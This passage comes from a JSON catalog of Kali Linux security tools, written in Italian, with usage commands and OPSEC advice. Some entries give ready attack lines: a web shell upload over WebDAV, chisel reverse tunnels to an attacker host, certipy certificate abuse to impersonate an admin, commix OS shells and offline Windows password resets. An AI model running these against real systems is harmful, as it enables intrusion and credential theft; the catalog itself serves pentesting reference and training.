    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Bytecode Viewer è un IDE per reverse engineering di applicazioni Java e Android che integra sei decompilatori diversi (Procyon, CFR, JD-GUI, FernFlower, Krakatau, JADX-Core) permettendo confronto side-by-side per ottenere la migliore ricostruzione del codice. Supporta JAR, CLASS, DEX, APK, ZIP e mostra simultaneamente: bytecode JVM/Dalvik raw, codice decompilato, e smali disassembly. Include editor esadecimale, ricerca full-text, e sistema plugin per estensioni.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>6 Decompilers:</strong> Procyon, CFR, JD-GUI, FernFlower (IntelliJ), Krakatau, JADX - confronto side-by-side per ogni classe.</p><p><strong>Bytecode View:</strong> Visualizza JVM bytecode raw, Dalvik bytecode, e Smali disassembly per analisi low-level.</p><p><strong>Multi-Format:</strong> Apre JAR, WAR, EAR, CLASS, DEX, APK, ZIP con navigazione struttura automatica.</p><p><strong>Search Engine:</strong> Ricerca full-text nel codice decompilato: stringhe, metodi, classi, regex.</p><p><strong>Hex Editor:</strong> Editor esadecimale integrato per patch binari diretti.</p><p><strong>Plugin System:</strong> Estensibile con plugin Java per analisi custom, detection obfuscation, malware signatures.</p><p><strong>Export:</strong> Esporta codice decompilato come progetto Java compilabile.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === AVVIO ===\njava -jar BytecodeViewer.jar\n# Oppure con più RAM per JAR grandi\njava -Xmx2G -jar BytecodeViewer.jar\n\n# === APERTURA FILE ===\n# File > Add... > seleziona JAR/APK/CLASS\n# Drag & drop supportato\n\n# === NAVIGAZIONE ===\n# Panel sinistro: tree struttura classi\n# Panel centrale: codice decompilato\n# Click classe per visualizzare\n\n# === CONFIGURAZIONE DECOMPILER ===\n# View > Pane 1/2/3: seleziona decompiler\n# Raccomandato: Procyon + CFR + FernFlower\n# Confronta output per codice più leggibile\n\n# === RICERCA ===\n# Search > Search\n# Trova: stringhe, metodi, classi\n# Regex supportato\n\n# Cerca stringhe interessanti:\n# - password, secret, key, token\n# - http://, https://, jdbc:\n# - encrypt, decrypt, hash\n\n# === WORKFLOW MALWARE ANALYSIS ===\n# 1. Apri JAR sospetto\n# 2. Cerca: URL, IP, domini\n# 3. Identifica entry point (main, applet)\n# 4. Traccia flusso di esecuzione\n# 5. Identifica payload/comportamento\n\n# === WORKFLOW APK ANALYSIS ===\n# 1. Apri APK\n# 2. Naviga: classes.dex > com.target.app\n# 3. Cerca: SharedPreferences, SQLite\n# 4. Identifica API keys hardcoded\n# 5. Analizza network calls (Retrofit, OkHttp)\n\n# === EXPORT ===\n# File > Save As > Java (decompiled)\n# Crea progetto importabile in IDE\n\n# === PLUGIN ===\n# Plugins > Plugin Console\n# Scrivi Java per automazione analisi</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Malware Analysis</strong>, analizza JAR malevoli (ransomware Java, RAT, droppers) distribuiti via phishing o exploit kits.</p><p>In <strong>Mobile Security</strong>, reverse engineering di app Android per trovare: API keys hardcoded, vulnerabilità logiche, bypass di controlli.</p><p>Per <strong>Vulnerability Research</strong>, analizza librerie Java (Struts, Spring, Log4j) per trovare sink/source di vulnerabilità.</p><p>In <strong>CTF</strong>, challenge Java/Android richiedono decompilazione per trovare flag o capire logica.</p><p>Per <strong>License Bypass</strong> (solo software proprio), identifica controlli di licenza per debugging.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Obfuscation:</strong> ProGuard, DexGuard, Zelix KlassMaster rendono output illeggibile. Nomi metodi/variabili persi (a, b, c).</p><p><strong>Native Code:</strong> JNI/.so libraries non sono analizzabili - serve Ghidra/IDA.</p><p><strong>Memory:</strong> JAR grandi (>100MB) richiedono RAM significativa. Aumentare -Xmx.</p><p><strong>Legal:</strong> Reverse engineering può violare EULA/DMCA. Solo per security research autorizzato o software proprio.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Reverse_Engineering"
    ],
    "notes": null
  },
  {
    "id": "cadaver",
    "name": "cadaver",
    "version": "0.26",
    "icon": "../app/icons/cadaver-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/cadaver/",
    "desc": "Client WebDAV da linea di comando per upload, download e gestione file remoti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Cadaver</strong> è un client WebDAV a linea di comando che permette di interagire con server web che espongono questa estensione HTTP. WebDAV (Web Distributed Authoring and Versioning) permette operazioni di file management remoto (upload, download, mkdir, delete) ed è spesso configurato male su server IIS, SharePoint o Apache, permettendo accessi non autorizzati.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>File Operations:</strong> put, get, mput, mget per upload/download di file singoli o multipli.</p><p><strong>Directory Management:</strong> mkdir, rmdir, ls, cd per navigare e gestire la struttura delle directory remote.</p><p><strong>Property Access:</strong> Lettura e modifica delle proprietà WebDAV dei file.</p><p><strong>Authentication:</strong> Supporta Basic, Digest e NTLM authentication.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Connessione a server WebDAV\ncadaver http://target.com/webdav/\n\n# Con credenziali\ncadaver -u user -p pass http://target.com/dav/\n\n# Comandi interattivi:\ndav:/webdav/> ls\ndav:/webdav/> put shell.aspx\ndav:/webdav/> get config.xml</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>Web Exploitation</strong>, quando si scopre WebDAV abilitato (tramite Nmap o nikto), cadaver permette di testare l'upload di web shell.</p><p>Per <strong>Post-Exploitation</strong>, facilita l'esfiltrazione di file da server compromessi.</p><p>Su <strong>SharePoint</strong>, può accedere a documenti con credenziali rubate.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le operazioni WebDAV sono loggate. L'upload di file eseguibili genera alert su WAF/IDS.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "File_Upload"
    ],
    "notes": null
  },
  {
    "id": "caido-cli",
    "name": "caido-cli",
    "version": "0.49.0",
    "icon": "../app/icons/caido-cli-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/caido-cli/",
    "desc": "Web proxy e security testing platform moderno, alternativa leggera a Burp.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Caido è un web security testing proxy di nuova generazione, progettato come alternativa moderna e leggera a Burp Suite. Scritto in Rust, offre prestazioni superiori e un'interfaccia utente più pulita. Disponibile sia come applicazione desktop che CLI, sta guadagnando popolarità nella community per la sua velocità e la curva di apprendimento più rapida.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>HTTP Proxy:</strong> Intercetta e modifica traffico HTTP/HTTPS con interfaccia moderna e responsive.</p><p><strong>Replay:</strong> Equivalente del Repeater di Burp, permette di modificare e rinviare richieste.</p><p><strong>Automate:</strong> Sistema di automazione per attacchi parametrizzati simile all'Intruder.</p><p><strong>Workflows:</strong> Automazione basata su regole per processare richieste automaticamente.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvio Caido CLI\ncaido-cli\n\n# Configurare browser su proxy 127.0.0.1:8080\n# Accesso interfaccia web su localhost per la GUI</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Web Pentesting</strong> quotidiano quando Burp risulta troppo pesante.</p><p>Ideale per chi cerca un'alternativa open-source con meno overhead. In crescita nella community <strong>Bug Bounty</strong> per la velocità.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Maturità:</strong> Più giovane di Burp, alcune funzionalità avanzate potrebbero mancare. Ecosistema di plugin meno sviluppato.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Proxy_MITM"
    ],
    "notes": null
  },
  {
    "id": "caldera",
    "name": "caldera",
    "version": "5.3.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/caldera/",
    "desc": "Framework MITRE per emulazione di avversari e red team automatizzato.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>CALDERA</strong> è un framework di adversary emulation sviluppato da MITRE che permette di automatizzare operazioni di red team seguendo le tattiche e tecniche del framework ATT&CK. Utilizza agenti deployati sui target per eseguire catene di attacco (\"adversary profiles\") in modo autonomo, simulando il comportamento di gruppi APT reali per testare le capacità di detection del blue team.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Adversary Profiles:</strong> Definisce sequenze di attacco mappate su MITRE ATT&CK che gli agenti eseguono autonomamente.</p><p><strong>Autonomous Agents:</strong> Agenti cross-platform (Windows, Linux, macOS) che ricevono istruzioni e reportano risultati.</p><p><strong>Fact Learning:</strong> Gli agenti raccolgono informazioni dal target (utenti, share, servizi) e adattano le operazioni successive.</p><p><strong>Plugin Architecture:</strong> Estendibile con plugin per nuove tecniche, C2 channels e reporting.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvio server CALDERA\npython3 server.py --insecure\n\n# Accesso interfaccia web: http://localhost:8888\n# Default credentials: admin:admin\n\n# Deploy agente su target e selezionare adversary profile dalla GUI</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Purple Team</strong> exercises dove red e blue team collaborano per testare le detection.</p><p>In <strong>Security Validation</strong>, verifica che i controlli di sicurezza rilevino tecniche specifiche.</p><p>Per <strong>Training</strong>, simula scenari di attacco realistici in ambiente controllato.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> Gli agenti e le tecniche sono documentati pubblicamente. SOC maturi potrebbero riconoscere i pattern. Usare per training, non per engagement reali.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "04_Red_Team",
      "C2_Frameworks"
    ],
    "notes": null
  },
  {
    "id": "certgraph",
    "name": "certgraph",
    "version": "20180911",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/certgraph/",
    "desc": "Esplora certificati SSL/TLS per scoprire sottodomini tramite SAN e CT logs.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Certgraph</strong> esplora i certificati SSL/TLS per scoprire relazioni tra domini e sottodomini. Analizza i campi Subject Alternative Name (SAN) dei certificati e segue le connessioni per costruire un grafo delle relazioni. Questa tecnica è particolarmente efficace perché i certificati wildcard e multi-dominio rivelano asset che potrebbero non essere trovati con altre tecniche di enumerazione.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>SAN Extraction:</strong> Estrae tutti i nomi alternativi dai certificati, rivelando sottodomini e domini correlati.</p><p><strong>Graph Building:</strong> Costruisce un grafo delle relazioni tra certificati e domini per visualizzare la struttura dell'infrastruttura.</p><p><strong>CT Log Integration:</strong> Può interrogare Certificate Transparency logs per trovare certificati storici.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scansione base\ncertgraph target.com\n\n# Con profondità di esplorazione\ncertgraph -depth 3 target.com\n\n# Output in formato DOT per visualizzazione\ncertgraph -json target.com | jq</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nella <strong>Reconnaissance</strong>, scopre asset condividendo certificati o elencati come SAN.</p><p>Per <strong>Attack Surface Mapping</strong>, rivela relazioni tra domini apparentemente non correlati. Complementa tool come Amass per massimizzare la copertura.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Stealth:</strong> Connessione TLS al target per recuperare il certificato. Usando CT logs, nessuna interazione diretta.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "certipy-ad",
    "name": "certipy-ad",
    "version": "5.0.3",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/certipy-ad/",
    "desc": "Enumera e sfrutta vulnerabilità AD CS (ESC1-ESC8) per privilege escalation.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Certipy è lo strumento definitivo per attaccare Active Directory Certificate Services (AD CS). Enumera la configurazione della PKI aziendale e identifica automaticamente le vulnerabilità note (ESC1-ESC11) che permettono privilege escalation fino a Domain Admin. Include funzionalità per richiedere certificati malevoli, eseguire relay attacks e impersonare altri utenti.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Find:</strong> Enumera CA, template e permessi per identificare vulnerabilità ESC1-ESC11 automaticamente.</p><p><strong>Request:</strong> Richiede certificati sfruttando template vulnerabili per impersonare altri utenti.</p><p><strong>Auth:</strong> Usa certificati ottenuti per autenticarsi via PKINIT e ottenere TGT o hash NTLM.</p><p><strong>Relay:</strong> Esegue NTLM relay verso l'endpoint HTTP di enrollment per ottenere certificati.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Enumerazione vulnerabilità\ncertipy find -u user@domain.local -p pass -dc-ip 192.168.1.10\n\n# Richiesta certificato (ESC1)\ncertipy req -u user@domain.local -p pass -target ca.domain.local -template VulnTemplate -upn admin@domain.local\n\n# Autenticazione con certificato\ncertipy auth -pfx admin.pfx -dc-ip 192.168.1.10</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>AD Pentesting</strong>, AD CS è spesso trascurato ma offre path di escalation devastanti.</p><p>ESC1 (SAN manipulation) è comune e permette di impersonare qualsiasi utente. Per <strong>Persistence</strong>, i certificati durano tipicamente 1 anno e bypassano il reset password.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le richieste certificato sono loggate sulla CA. Alert su template sensibili o SAN inusuali sono possibili.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "cewl",
    "name": "cewl",
    "version": "6.2.1",
    "icon": "../app/icons/cewl-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/cewl/",
    "desc": "Genera wordlist custom crawlando siti web ed estraendo parole uniche.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>CeWL</strong> (Custom Word List generator) crea wordlist personalizzate analizzando il contenuto di un sito web target. Crawla le pagine estraendo parole uniche che vengono poi usate per attacchi di password cracking. Le password aziendali spesso contengono termini specifici del business (nomi prodotti, slogan, termini tecnici) che CeWL cattura automaticamente.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Web Crawling:</strong> Spider il sito fino a una profondità configurabile, seguendo link interni.</p><p><strong>Word Extraction:</strong> Estrae parole con lunghezza minima configurabile, rimuovendo duplicati.</p><p><strong>Email Extraction:</strong> Può estrarre anche indirizzi email trovati nelle pagine.</p><p><strong>Metadata:</strong> Opzionalmente estrae metadati da documenti (PDF, DOC) linkati.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Crawl base con output su file\ncewl -w wordlist.txt https://target.com\n\n# Con profondità e lunghezza minima\ncewl -d 3 -m 6 -w words.txt https://target.com\n\n# Estrazione email inclusa\ncewl -e -w words.txt --email_file emails.txt https://target.com</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Prima di attacchi <strong>Password Cracking</strong>, crea wordlist mirate che aumentano la probabilità di successo.</p><p>Per <strong>Targeted Attacks</strong>, le password spesso contengono nomi aziendali o di prodotti. Combinare con regole hashcat per mutazioni.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> Il crawling genera traffico HTTP. Rate limiting può rivelare l'attività. Usare user agent rotation.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "00_Common",
      "Wordlists"
    ],
    "notes": null
  },
  {
    "id": "chainsaw",
    "name": "chainsaw",
    "version": "2.12.2",
    "icon": "../app/icons/chainsaw-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/chainsaw/",
    "desc": "Analizza rapidamente log Windows (EVTX) con regole Sigma e hunting automatizzato.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Chainsaw</strong> è uno strumento di triage forense per log Windows Event Log (EVTX). Scritto in Rust per massima velocità, può processare gigabyte di log in secondi cercando indicatori di compromissione usando regole Sigma, detection logic custom o keyword search. È progettato per gli incident responder che hanno bisogno di risposte rapide.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Sigma Integration:</strong> Applica migliaia di regole Sigma per rilevare tecniche di attacco note (lateral movement, persistence, credential access).</p><p><strong>Hunt Mode:</strong> Cerca pattern sospetti predefiniti (PowerShell encoded, service creation, scheduled tasks).</p><p><strong>Search:</strong> Ricerca full-text e regex attraverso tutti i campi degli eventi.</p><p><strong>Timeline:</strong> Genera timeline degli eventi per ricostruire la sequenza dell'attacco.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Hunt con regole Sigma\nchainsaw hunt /path/to/evtx/ -s sigma/ --mapping sigma-mapping.yml\n\n# Ricerca keyword specifica\nchainsaw search -t 'mimikatz' /path/to/evtx/\n\n# Analisi con output JSON\nchainsaw hunt /path/to/evtx/ -s sigma/ -o results.json --json</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>Incident Response</strong>, fornisce triage immediato dei log per identificare l'attacco.</p><p>Per <strong>Threat Hunting</strong>, cerca proattivamente indicatori di compromissione.</p><p>Durante <strong>Forensics</strong>, ricostruisce la timeline dell'intrusione.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Red Team:</strong> Conoscere chainsaw aiuta a capire cosa cercare e come evitare detection nei log.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "05_Forensics",
      "Disk_Analysis"
    ],
    "notes": null
  },
  {
    "id": "chisel-kali",
    "name": "chisel",
    "version": "1.10.1",
    "icon": "../app/icons/chisel-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/chisel/",
    "desc": "Tunnel TCP/UDP veloce over HTTP, perfetto per pivoting in ambienti restrittivi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Chisel</strong> è un tunnel TCP/UDP velocissimo che opera over HTTP/HTTPS, progettato per bypassare firewall restrittivi. Un singolo binario Go cross-platform implementa sia il client che il server, supportando forward e reverse tunneling. È lo strumento preferito per il pivoting durante penetration test quando le connessioni dirette sono bloccate.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>HTTP Tunneling:</strong> Incapsula il traffico TCP/UDP in HTTP, passando attraverso proxy e WAF.</p><p><strong>Reverse Tunneling:</strong> Il client interno si connette al server esterno, bypassando NAT e firewall.</p><p><strong>Port Forwarding:</strong> Forward locale, remoto e SOCKS proxy tutti in un tool.</p><p><strong>Encryption:</strong> Tutto il traffico è cifrato, apparendo come normale HTTPS.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Server (attacker)\nchisel server -p 8080 --reverse\n\n# Client reverse tunnel (vittima)\nchisel client attacker:8080 R:9050:socks\n\n# Forward tunnel locale\nchisel client attacker:8080 1080:socks\n\n# Tunnel specifico\nchisel client attacker:8080 R:3389:10.0.0.5:3389</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Pivoting</strong> in reti segmentate, crea tunnel SOCKS per raggiungere subnet interne.</p><p>In ambienti con <strong>Egress Filtering</strong> restrittivo dove solo HTTP/HTTPS escono.</p><p>Per <strong>Post-Exploitation</strong>, porta accesso RDP/SSH attraverso firewall.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> Il pattern di traffico WebSocket può essere riconosciuto. Usare --socks5 per proxy chain. Il binario su disco è un artefatto.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "chntpw",
    "name": "chntpw",
    "version": "140201",
    "icon": "../app/icons/chntpw-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/chntpw/",
    "desc": "Resetta o modifica password Windows NT/2000/XP/Vista/7 dal file SAM offline.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Chntpw</strong> (Change NT Password) è uno strumento per manipolare il registro Windows e il database SAM offline. Permette di resettare o modificare password di account locali, abilitare/disabilitare account e modificare la membership di gruppi senza conoscere la password originale. Richiede accesso fisico o boot da media esterno (es. Kali Live).</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Password Reset:</strong> Azzera la password di qualsiasi account locale, permettendo login senza password.</p><p><strong>Account Management:</strong> Abilita account disabilitati (incluso l'Administrator nascosto), modifica flag account.</p><p><strong>Group Membership:</strong> Aggiunge utenti a gruppi privilegiati (Administrators) modificando il SAM.</p><p><strong>Registry Editing:</strong> Editor generico per file registry Windows (SAM, SYSTEM, SOFTWARE).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Boot da Kali Live, montare partizione Windows\nmount /dev/sda2 /mnt/windows\n\n# Reset password interattivo\nchntpw -i /mnt/windows/Windows/System32/config/SAM\n\n# Reset diretto utente specifico\nchntpw -u Administrator /mnt/windows/Windows/System32/config/SAM</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nel <strong>Physical Pentesting</strong>, quando si ha accesso fisico a un PC, chntpw bypassa l'autenticazione locale.</p><p>Per <strong>Recovery</strong>, quando un amministratore dimentica la password.</p><p>In <strong>Forensics</strong>, abilita account per esaminare il sistema.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Limitazioni:</strong> Non funziona con account Microsoft/Azure AD. BitLocker blocca l'accesso offline. Modifica artefatti forensi.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Dumping"
    ],
    "notes": null
  },
  {
    "id": "cloud-enum",
    "name": "cloud-enum",
    "version": "0.7",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/cloud-enum/",
    "desc": "Enumera risorse cloud pubbliche (S3, Azure blobs, GCP buckets) di un target.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Cloud_enum automatizza la discovery di risorse cloud pubblicamente accessibili appartenenti a un'organizzazione target. Cerca bucket S3, container Azure Blob Storage e Google Cloud Storage usando permutazioni del nome aziendale, identificando risorse mal configurate che espongono dati sensibili. È un tool essenziale per l'External Attack Surface Management.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Cloud:</strong> Supporta AWS S3, Azure Blob, Google Cloud Storage in un unico scan.</p><p><strong>Permutation Engine:</strong> Genera variazioni del nome target (company-backup, company-dev, company-prod) per massimizzare la copertura.</p><p><strong>Access Verification:</strong> Verifica quali risorse trovate sono effettivamente accessibili pubblicamente.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Enumerazione base\ncloud_enum -k companyname\n\n# Con wordlist custom\ncloud_enum -k companyname -m mutations.txt\n\n# Solo specifici provider\ncloud_enum -k companyname --disable-azure --disable-gcp</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nella <strong>Reconnaissance</strong>, trova storage cloud esposti che potrebbero contenere backup, log, codice sorgente o dati clienti.</p><p>Per <strong>Bug Bounty</strong>, i bucket mal configurati sono finding comuni e remunerativi.</p><p>In <strong>Compliance Audit</strong>, verifica che l'organizzazione non esponga dati accidentalmente.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Legalità:</strong> Enumerare è legale, ma accedere a dati non autorizzati non lo è. Documentare sempre i finding senza scaricare contenuti.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence"
    ],
    "notes": null
  },
  {
    "id": "cloudbrute",
    "name": "cloudbrute",
    "version": "1.0.7",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/cloudbrute/",
    "desc": "Trova storage cloud mal configurati tramite brute force di nomi comuni.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>CloudBrute</strong> è un tool scritto in Go per la discovery di risorse cloud tramite brute force. Più veloce delle alternative Python, enumera bucket S3, Azure Storage e GCP testando migliaia di nomi al secondo. Include wordlist ottimizzate per pattern comuni nel naming di risorse cloud (backup, logs, dev, staging).</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>High Performance:</strong> Scritto in Go con goroutine per massimo parallelismo.</p><p><strong>Multi-Provider:</strong> AWS, Azure, GCP e DigitalOcean Spaces supportati.</p><p><strong>Smart Wordlists:</strong> Include liste specifiche per cloud resources naming conventions.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Brute force con keyword\ncloudbrute -d target.com -k target -w wordlist.txt\n\n# Solo AWS con output\ncloudbrute -d target.com -k target -p aws -o results.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Simile a cloud_enum ma più veloce per scan massivi. Per <strong>Large Scale Reconnaissance</strong> su molti target.</p><p>In <strong>Automated Pipelines</strong> dove la velocità è critica.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rate Limiting:</strong> Il volume di richieste può triggerare rate limiting o ban. Distribuire le richieste nel tempo.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence"
    ],
    "notes": null
  },
  {
    "id": "commix",
    "name": "commix",
    "version": "4.0",
    "icon": "../app/icons/commix-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/commix/",
    "desc": "Automatizza test e sfruttamento di command injection su applicazioni web.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Commix</strong> (Command Injection Exploiter) è uno strumento automatizzato per la detection e lo sfruttamento di vulnerabilità di OS command injection nelle applicazioni web. Testa sistematicamente diversi vettori e tecniche di injection (classic, eval-based, time-based blind) e, una volta trovata la vulnerabilità, può stabilire una shell interattiva per il post-exploitation.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multiple Techniques:</strong> Classic injection (;, |, &&), eval-based, time-based blind, file-based.</p><p><strong>Shell Access:</strong> Una volta confermata l'injection, fornisce pseudo-shell interattiva per eseguire comandi.</p><p><strong>Reverse Shell:</strong> Può stabilire reverse shell diretta verso l'attaccante.</p><p><strong>WAF Bypass:</strong> Include tecniche di evasione e encoding per bypassare filtri.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Test parametro specifico\ncommix -u \"http://target.com/page.php?cmd=whoami\" --level=3\n\n# Con data POST\ncommix -u \"http://target.com/page.php\" --data=\"cmd=test\" --level=3\n\n# Shell pseudo-terminale\ncommix -u \"http://target.com/page.php?cmd=id\" --os-shell</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nel <strong>Web Pentesting</strong>, quando si sospetta command injection (form che interagiscono con il sistema, ping utilities, PDF generators).</p><p>Per <strong>Exploitation</strong> rapido di injection trovate manualmente. Come SQLmap ma per OS command injection.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> I payload di injection sono riconoscibili da WAF. Time-based blind genera molte richieste.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Injection",
      "Command_Injection"
    ],
    "notes": null
  },
  {
    "id": "cowpatty",
    "name": "cowpatty",
    "version": "4.8",
    "icon": "../app/icons/cowpatty-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/cowpatty/",
    "desc": "Cracca WPA/WPA2-PSK usando dizionari o rainbow table precomputate.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>coWPAtty</strong> è uno strumento per il cracking offline di password WPA/WPA2-PSK. A differenza di aircrack-ng che calcola le chiavi al volo, coWPAtty può utilizzare rainbow table precomputate (PMK - Pairwise Master Key) che velocizzano drasticamente l'attacco se sono disponibili per l'SSID target. Richiede un handshake catturato.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Dictionary Attack:</strong> Attacco classico con wordlist, calcolando PMK per ogni password tentata.</p><p><strong>Rainbow Table:</strong> Utilizza hash precomputati per SSID specifici, riducendo il tempo di crack a secondi.</p><p><strong>Table Generation:</strong> Include genpmk per creare rainbow table personalizzate per SSID target.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Attacco dizionario\ncowpatty -r capture.cap -f wordlist.txt -s TargetSSID\n\n# Con rainbow table precomputata\ncowpatty -r capture.cap -d rainbow_table.cow -s TargetSSID\n\n# Generazione rainbow table\ngenpmk -f wordlist.txt -d output.cow -s TargetSSID</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>Wireless Pentesting</strong>, le rainbow table accelerano enormemente il cracking per SSID comuni (\"linksys\", \"NETGEAR\").</p><p>Per <strong>Enterprise</strong>, creare table per l'SSID aziendale permette di testare la robustezza delle password rapidamente.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Limitazioni:</strong> Le rainbow table sono specifiche per SSID. SSID unici richiedono generazione custom che può richiedere tempo.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Cracking"
    ],
    "notes": null
  },
  {
